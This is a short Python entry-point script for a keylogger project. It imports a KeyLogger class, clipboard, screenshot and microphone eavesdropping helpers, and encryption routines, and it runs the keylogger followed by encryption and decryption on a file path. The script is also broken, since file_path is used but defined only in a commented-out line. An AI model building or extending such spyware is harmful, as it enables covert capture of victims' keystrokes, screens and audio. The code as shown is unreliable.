from keylogger.eavesdrop import copy_clipboard, microphone, screenshot

from KeyLogger import KeyLogger
from crypto.Encryption import Encryption
from crypto.Decryption import Decryption


def print_hello_world(name):
    print(f'Hello, {name}')


if __name__ == '__main__':
    # print_hello_world('World!') # REMOVE IT, AFTER PROJECT FINISH
    # file_path = ""  # file path for files to be saved to
    # SystemInfoProvider().fetch_and_save_computer_information(file_path)

    KeyLogger(file_path=file_path)
    # copy_clipboard()
    # screenshot()
    # microphone()
    Encryption(file_path=file_path)
    Decryption(file_path=file_path)
    pass
